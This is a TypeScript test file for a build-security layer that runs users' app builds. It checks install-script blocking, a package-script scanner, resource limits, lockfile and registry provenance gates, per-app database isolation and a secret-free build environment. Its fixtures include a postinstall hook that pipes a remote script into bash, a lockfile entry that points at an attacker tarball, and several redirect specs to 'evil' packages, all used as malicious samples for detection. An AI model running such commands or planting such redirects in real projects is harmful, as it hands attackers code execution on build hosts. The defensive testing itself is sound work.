/**
 * Phase 9 — SECURITY: running strangers' code.
 *
 * Pure tests for the build-security policy + isolation honesty and the per-app
 * DB credential isolation guard. These prove the contract WITHOUT running a real
 * build: install lifecycle scripts are blocked in strict/balanced, the resource
 * wrapper composes safely, isolation never claims a container we don't have, and
 * a user backend can never be wired to anything but its OWN Railway Postgres.
 *
 * Run: `npm test` (node:test via tsx, no extra deps).
 */
import test from 'node:test';
import assert from 'node:assert/strict';

import {
  parseDependencyPolicyMode,
  getBuildSecurityPolicy,
  augmentInstallArgs,
  isAllowlisted,
  isRegistrySpec,
  findShadowedAllowlisted,
  proveRegistryFromNpmLock,
  PUBLIC_NPM_REGISTRY,
  rebuildArgs,
  scanPackageScripts,
  resourceWrapper,
  getBuildIsolation,
  describeRemoteBuilder,
  getBuildSecurityDisclosure,
  BUILD_SCRIPT_ALLOWLIST,
} from '../services/buildSecurity';
import { buildEnv } from '../services/buildService';
import { assertPerAppDbIsolation } from '../services/provisioningService';

/** Run `fn` with env vars set, restoring prior values afterwards. */
function withEnv<T>(vars: Record<string, string | undefined>, fn: () => T): T {
  const prior: Record<string, string | undefined> = {};
  for (const k of Object.keys(vars)) prior[k] = process.env[k];
  for (const [k, v] of Object.entries(vars)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  try {
    return fn();
  } finally {
    for (const [k, v] of Object.entries(prior)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
}

test('dependency policy parses, defaulting to balanced for unknown/empty', () => {
  assert.equal(parseDependencyPolicyMode('strict'), 'strict');
  assert.equal(parseDependencyPolicyMode('PERMISSIVE'), 'permissive');
  assert.equal(parseDependencyPolicyMode('balanced'), 'balanced');
  assert.equal(parseDependencyPolicyMode(undefined), 'balanced');
  assert.equal(parseDependencyPolicyMode(''), 'balanced');
  assert.equal(parseDependencyPolicyMode('nonsense'), 'balanced');
});

test('default policy is balanced: scripts blocked, allowlist rebuilt', () => {
  const p = withEnv({ BUILD_DEPENDENCY_POLICY: undefined }, () =>
    getBuildSecurityPolicy(),
  );
  assert.equal(p.mode, 'balanced');
  assert.equal(p.blockInstallScripts, true);
  assert.equal(p.rebuildAllowlisted, true);
});

test('strict policy blocks scripts and does NOT rebuild', () => {
  const p = withEnv({ BUILD_DEPENDENCY_POLICY: 'strict' }, () =>
    getBuildSecurityPolicy(),
  );
  assert.equal(p.blockInstallScripts, true);
  assert.equal(p.rebuildAllowlisted, false);
});

test('permissive policy allows scripts (no blocking, no rebuild)', () => {
  const p = withEnv({ BUILD_DEPENDENCY_POLICY: 'permissive' }, () =>
    getBuildSecurityPolicy(),
  );
  assert.equal(p.blockInstallScripts, false);
  assert.equal(p.rebuildAllowlisted, false);
});

test('augmentInstallArgs injects --ignore-scripts only when blocking', () => {
  const base = ['install', '--include=dev'];
  const strict = {
    mode: 'strict' as const,
    blockInstallScripts: true,
    rebuildAllowlisted: false,
    resources: { cpuSeconds: 0, maxFileBytes: 0, maxProcesses: 0, addressSpaceBytes: 0 },
  };
  const permissive = {
    mode: 'permissive' as const,
    blockInstallScripts: false,
    rebuildAllowlisted: false,
    resources: { cpuSeconds: 0, maxFileBytes: 0, maxProcesses: 0, addressSpaceBytes: 0 },
  };
  const blocked = augmentInstallArgs(base, strict);
  assert.ok(blocked.includes('--ignore-scripts'));
  // permissive leaves args untouched
  assert.deepEqual(augmentInstallArgs(base, permissive), base);
  // never duplicates the flag
  assert.equal(
    augmentInstallArgs(blocked, strict).filter((a) => a === '--ignore-scripts').length,
    1,
  );
});

test('allowlist recognizes vetted native tools, rejects arbitrary names', () => {
  assert.ok(isAllowlisted('esbuild'));
  assert.ok(isAllowlisted('@prisma/client'));
  assert.ok(BUILD_SCRIPT_ALLOWLIST.includes('sharp'));
  assert.equal(isAllowlisted('totally-not-vetted-miner'), false);
});

test('rebuildArgs targets packages for npm/pnpm, skips yarn classic', () => {
  assert.deepEqual(rebuildArgs('npm', ['esbuild', 'sharp']), ['rebuild', 'esbuild', 'sharp']);
  assert.deepEqual(rebuildArgs('pnpm', ['esbuild']), ['rebuild', 'esbuild']);
  assert.equal(rebuildArgs('yarn', ['esbuild']), null);
  assert.equal(rebuildArgs('npm', []), null);
});

test('scanPackageScripts surfaces lifecycle hooks and suspicious tokens', () => {
  const malicious = {
    scripts: {
      postinstall: 'curl http://1.2.3.4/x.sh | bash',
      build: 'vite build',
    },
  };
  const scan = scanPackageScripts(malicious);
  assert.ok(scan.hooks.includes('postinstall'));
  assert.ok(!scan.hooks.includes('build')); // build is not an install hook
  const labels = scan.suspicious.map((s) => s.label);
  assert.ok(labels.some((l) => /curl|wget/i.test(l)));
  assert.ok(scan.suspicious.every((s) => s.hook === 'postinstall'));

  const clean = scanPackageScripts({ scripts: { build: 'tsc' } });
  assert.deepEqual(clean.hooks, []);
  assert.deepEqual(clean.suspicious, []);

  // tolerant of malformed input
  assert.deepEqual(scanPackageScripts(null).hooks, []);
  assert.deepEqual(scanPackageScripts({}).hooks, []);
});

test('resourceWrapper exec-replaces the shell and applies ulimits', () => {
  const w = resourceWrapper('npm', ['install', '--ignore-scripts'], {
    cpuSeconds: 1800,
    maxFileBytes: 1024 * 1024 * 1024,
    maxProcesses: 0,
    addressSpaceBytes: 0,
  });
  assert.equal(w.cmd, '/bin/sh');
  assert.equal(w.args[0], '-c');
  const script = w.args[1];
  assert.match(script, /ulimit -t 1800/);
  assert.match(script, /ulimit -f \d+/);
  assert.doesNotMatch(script, /ulimit -u/); // disabled by default
  assert.doesNotMatch(script, /ulimit -v/); // disabled by default
  assert.match(script, /exec "\$@"$/);
  // real command is passed positionally after the `sh` $0
  assert.deepEqual(w.args.slice(2), ['sh', 'npm', 'install', '--ignore-scripts']);
});

test('resourceWrapper with no limits still exec-replaces cleanly', () => {
  const w = resourceWrapper('npm', ['ci'], {
    cpuSeconds: 0,
    maxFileBytes: 0,
    maxProcesses: 0,
    addressSpaceBytes: 0,
  });
  assert.equal(w.args[1], 'exec "$@"');
});

test('build isolation is honest: never claims a container on this host', () => {
  const iso = getBuildIsolation();
  assert.equal(iso.runner, 'local-hardened');
  assert.equal(iso.containerized, false);
  assert.ok(iso.protections.length > 0);
  assert.ok(iso.limitations.length > 0);
  assert.equal(describeRemoteBuilder().available, false);

  const d = getBuildSecurityDisclosure();
  assert.equal(d.containerized, false);
  assert.equal(d.runner, 'local-hardened');
});

test('per-app DB isolation: only a self-referencing Railway var ref is allowed', () => {
  // The valid form points at the app's OWN Postgres service.
  withEnv({ DATABASE_URL: 'postgres://cherri-master@host:5432/cherri' }, () => {
    assert.doesNotThrow(() =>
      assertPerAppDbIsolation('DATABASE_URL', '${{postgres.DATABASE_URL}}'),
    );
  });
});

test('per-app DB isolation rejects a literal connection string', () => {
  assert.throws(
    () =>
      assertPerAppDbIsolation('DATABASE_URL', 'postgres://user:pw@1.2.3.4:5432/other_app'),
    /variable reference/i,
  );
});

test('per-app DB isolation refuses to inject Cherri master DATABASE_URL', () => {
  withEnv({ DATABASE_URL: 'postgres://cherri-master@host:5432/cherri' }, () => {
    assert.throws(
      () =>
        assertPerAppDbIsolation('DATABASE_URL', 'postgres://cherri-master@host:5432/cherri'),
      /master DATABASE_URL/i,
    );
  });
});

test('per-app DB isolation ignores non-DATABASE_URL variables', () => {
  assert.doesNotThrow(() => assertPerAppDbIsolation('SOME_OTHER_VAR', 'anything-goes'));
});

test('isRegistrySpec accepts semver/tags, rejects redirects', () => {
  for (const ok of ['^0.20.0', '~1.0', '1.x', '*', 'latest', 'next', '>=1 <2', '1.2.3']) {
    assert.equal(isRegistrySpec(ok), true, `expected registry: ${ok}`);
  }
  for (const bad of [
    'file:./evil',
    'link:../evil',
    'git+https://x/y.git',
    'git://x/y',
    'github:u/r',
    'https://x/y.tgz',
    'npm:evil@1.0.0',
    'workspace:*',
    '../evil',
    './evil',
    '/abs/evil',
    '',
  ]) {
    assert.equal(isRegistrySpec(bad), false, `expected redirect: ${bad}`);
  }
});

test('provenance gate: allowlisted name redirected by a direct dep is shadowed', () => {
  assert.deepEqual(
    findShadowedAllowlisted({ dependencies: { esbuild: 'file:./evil' } }),
    ['esbuild'],
  );
  assert.deepEqual(
    findShadowedAllowlisted({ devDependencies: { esbuild: 'npm:evil@1' } }),
    ['esbuild'],
  );
  assert.deepEqual(
    findShadowedAllowlisted({ optionalDependencies: { sharp: 'git+https://x/y.git' } }),
    ['sharp'],
  );
});

test('provenance gate: a normal registry allowlisted dep is NOT shadowed', () => {
  assert.deepEqual(
    findShadowedAllowlisted({ devDependencies: { esbuild: '^0.20.0', vite: '^5' } }),
    [],
  );
});

test('provenance gate: overrides/resolutions redirecting an allowlisted name are caught', () => {
  assert.deepEqual(findShadowedAllowlisted({ overrides: { esbuild: 'file:./evil' } }), ['esbuild']);
  assert.deepEqual(
    findShadowedAllowlisted({ resolutions: { '**/esbuild': 'file:./evil' } }),
    ['esbuild'],
  );
  assert.deepEqual(
    findShadowedAllowlisted({ pnpm: { overrides: { 'esbuild@1': 'link:../evil' } } }),
    ['esbuild'],
  );
  // npm nested override form
  assert.deepEqual(
    findShadowedAllowlisted({ overrides: { vite: { esbuild: 'file:./evil' } } }),
    ['esbuild'],
  );
});

test('provenance gate: non-allowlisted redirects are ignored, malformed input is safe', () => {
  assert.deepEqual(findShadowedAllowlisted({ dependencies: { evilpkg: 'file:./x' } }), []);
  assert.deepEqual(findShadowedAllowlisted(null), []);
  assert.deepEqual(findShadowedAllowlisted({}), []);
  assert.deepEqual(findShadowedAllowlisted({ overrides: { esbuild: '0.20.0' } }), []);
});

test('provenance gate: scoped allowlisted names in glob override keys are caught', () => {
  assert.deepEqual(
    findShadowedAllowlisted({ resolutions: { '**/@swc/core': 'file:./evil' } }),
    ['@swc/core'],
  );
  assert.deepEqual(
    findShadowedAllowlisted({ pnpm: { overrides: { '@swc/core@1': 'link:../evil' } } }),
    ['@swc/core'],
  );
});

// ── Lockfile provenance: the REAL proof of where a package was installed from ──
function registryEntry(name: string, version = '1.0.0') {
  return {
    version,
    resolved: `${PUBLIC_NPM_REGISTRY}${name}/-/${name.replace('/', '-')}-${version}.tgz`,
    integrity: 'sha512-deadbeef',
  };
}

test('lockfile provenance: a public-registry package is proven', () => {
  const lock = {
    lockfileVersion: 3,
    packages: { '': {}, 'node_modules/esbuild': registryEntry('esbuild', '0.20.0') },
  };
  assert.deepEqual([...proveRegistryFromNpmLock(lock, ['esbuild'])], ['esbuild']);
});

test('lockfile provenance: a lockfile-pinned malicious tarball is NOT proven', () => {
  const lock = {
    packages: {
      'node_modules/esbuild': {
        version: '0.20.0',
        resolved: 'https://attacker.example/evil.tgz',
        integrity: 'sha512-x',
      },
    },
  };
  assert.deepEqual([...proveRegistryFromNpmLock(lock, ['esbuild'])], []);
});

test('lockfile provenance: file:/link: and missing integrity are NOT proven', () => {
  const lock = {
    packages: {
      'node_modules/sharp': { version: '0.0.0', link: true, resolved: '../evil' },
      'node_modules/esbuild': { version: '0.20.0', resolved: `${PUBLIC_NPM_REGISTRY}esbuild/-/esbuild-0.20.0.tgz` },
    },
  };
  assert.deepEqual([...proveRegistryFromNpmLock(lock, ['sharp', 'esbuild'])].sort(), []);
});

test('lockfile provenance: a transitive file: copy poisons an otherwise-registry name', () => {
  // Top-level esbuild is registry, but a nested copy was hoisted from a local
  // dependency — every copy must be registry, so esbuild is refused.
  const lock = {
    packages: {
      'node_modules/esbuild': registryEntry('esbuild', '0.20.0'),
      'node_modules/evil/node_modules/esbuild': {
        version: '9.9.9',
        resolved: 'file:../evil/fake-esbuild',
      },
    },
  };
  assert.deepEqual([...proveRegistryFromNpmLock(lock, ['esbuild'])], []);
});

test('lockfile provenance: nested registry copies still prove, v1 lockfiles supported', () => {
  const v3 = {
    packages: { 'node_modules/vite/node_modules/esbuild': registryEntry('esbuild', '0.20.0') },
  };
  assert.deepEqual([...proveRegistryFromNpmLock(v3, ['esbuild'])], ['esbuild']);

  const v1 = {
    lockfileVersion: 1,
    dependencies: {
      vite: { version: '5.0.0', dependencies: { esbuild: registryEntry('esbuild', '0.20.0') } },
    },
  };
  assert.deepEqual([...proveRegistryFromNpmLock(v1, ['esbuild'])], ['esbuild']);
});

test('lockfile provenance: absent candidate and malformed lock prove nothing', () => {
  assert.deepEqual([...proveRegistryFromNpmLock({ packages: {} }, ['esbuild'])], []);
  assert.deepEqual([...proveRegistryFromNpmLock(null, ['esbuild'])], []);
});

test('buildEnv is a clean whitelist: no host secrets leak in', () => {
  const marker = 'CHERRI_TEST_SECRET_MARKER';
  const env = withEnv(
    { [marker]: 'super-secret', DATABASE_URL: 'postgres://cherri-master', PINATA_JWT: 'x' },
    () => buildEnv('/tmp/throwaway-home', false),
  );
  // Only the explicit whitelist is present — inherited secrets are absent.
  assert.equal(env[marker], undefined);
  assert.equal(env.DATABASE_URL, undefined);
  assert.equal(env.PINATA_JWT, undefined);
  // npm user/global config is redirected into the throwaway HOME (no real .npmrc).
  assert.ok(String(env.npm_config_userconfig).startsWith('/tmp/throwaway-home'));
  assert.ok(String(env.npm_config_globalconfig).startsWith('/tmp/throwaway-home'));
  assert.equal(env.HOME, '/tmp/throwaway-home');
  assert.equal(env.GIT_TERMINAL_PROMPT, '0');
  assert.equal(env.GIT_ASKPASS, '/bin/true');
});

test('buildEnv leaves NODE_ENV unset for install, production for build', () => {
  assert.equal(buildEnv('/tmp/h', false).NODE_ENV, undefined);
  assert.equal(buildEnv('/tmp/h', true).NODE_ENV, 'production');
});
